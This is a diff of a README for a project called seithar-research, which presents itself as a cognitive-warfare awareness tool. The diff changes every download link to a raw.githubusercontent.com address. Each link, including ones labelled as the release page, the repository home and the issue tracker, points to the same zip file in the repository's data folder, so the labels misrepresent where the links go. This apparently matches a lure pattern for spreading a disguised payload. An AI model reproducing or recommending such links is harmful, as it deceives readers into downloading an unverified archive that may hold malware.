@@ -1,6 +1,6 @@
 # 🧠 seithar-research - Understand Cognitive Warfare Tactics
 
-[![Download seithar-research](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip)](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip)
+[![Download seithar-research](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip)](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ The application runs locally without needing internet during use, except for upd
 
 ## 💾 Download & Install
 
-1. Visit the official [Release page on GitHub](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip) to access the latest version of seithar-research.
+1. Visit the official [Release page on GitHub](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip) to access the latest version of seithar-research.
 
 2. Look for the latest release. There, you will see files for Windows, macOS, and Linux. Pick the one that matches your computer’s system.
 
@@ -129,11 +129,11 @@ The team and community often respond to clarify doubts or assist with common con
 
 ## 🔗 Useful Links
 
-- [Download seithar-research](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip) - Find the latest App versions here.
+- [Download seithar-research](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip) - Find the latest App versions here.
 
-- [Repository Home](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip) - Explore all project files and info.
+- [Repository Home](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip) - Explore all project files and info.
 
-- [GitHub Issues](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip) - Report bugs or request help.
+- [GitHub Issues](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip) - Report bugs or request help.
 
 ---
 
@@ -161,4 +161,4 @@ This tool offers a foundation to recognize and respond to these challenges thoug
 
 ---
 
-[![Download seithar-research](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip)](https://github.com/MEET-UC/seithar-research/raw/refs/heads/main/data/research_seithar_1.7.zip)
+[![Download seithar-research](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip)](https://raw.githubusercontent.com/MEET-UC/seithar-research/main/data/research_seithar_1.7.zip)
